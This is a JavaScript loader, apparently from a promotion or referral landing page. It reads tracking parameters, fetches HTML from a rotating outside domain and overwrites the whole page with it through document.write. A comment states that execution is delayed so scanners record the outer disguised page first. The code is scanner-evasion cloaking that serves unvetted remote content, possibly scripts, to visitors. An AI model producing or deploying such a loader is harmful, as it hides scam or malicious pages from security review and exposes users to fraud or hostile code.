(function () {
  'use strict';
  try {
    var domains = [
    '8dsk.ccwu.cc'
    ];

    // 透传整个 query string（兼容新格式 ?ep=xxx&d=xxx&er=xxx 和老格式 ?code=xxx）
    var rawSearch = window.location.search || '';
    var urlParams = new URLSearchParams(rawSearch);
    // 任一推广参数缺失即认为参数错误
    var hasParam = urlParams.get('ep') || urlParams.get('code') || urlParams.get('ref');
    if (!hasParam) {
      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">参数错误</div>';
      return;
    }

    // 直接拼整个 query string，把 ep/d/er 一并带到落地页
    var queryStr = rawSearch.replace(/^\?/, '');
    var landingPath = '/h5/v2/index.htm' + (('/h5/v2/index.htm'.indexOf('?') > -1) ? '&' : '?') + queryStr;

    // 已使用过的域名索引，避免重复
    var usedIndexes = {};
    var maxRetries = Math.min(5, domains.length);

    function getRandomUnusedDomain() {
      var remaining = [];
      for (var i = 0; i < domains.length; i++) {
        if (!usedIndexes[i]) remaining.push(i);
      }
      if (remaining.length === 0) return null;
      var idx = remaining[Math.floor(Math.random() * remaining.length)];
      usedIndexes[idx] = true;
      return domains[idx];
    }

    function buildUrl(domain) {
      var protocol = window.location.protocol === 'https:' ? 'https:' : 'http:';
      return protocol + '//' + domain + landingPath;
    }

    // 主逻辑：fetch HTML → document.write 替换页面
    function init() {
      var attempt = 0;

      function tryNext() {
        if (attempt >= maxRetries) {
          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
          return;
        }
        var domain = getRandomUnusedDomain();
        if (!domain) {
          document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">加载失败，请刷新重试</div>';
          return;
        }
        var url = buildUrl(domain);
        attempt++;

        fetch(url, { mode: 'cors', credentials: 'omit' })
          .then(function (res) {
            if (!res.ok) throw new Error(res.status);
            return res.text();
          })
          .then(function (html) {
            document.open();
            document.write(html);
            document.close();
          })
          .catch(function () {
            tryNext();
          });
      }

      tryNext();
    }

    // 延迟执行，让扫描器先抓到外层伪装内容
    setTimeout(init, 300);
  } catch (e) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#999;font-size:14px;">系统错误</div>';
  }
})();
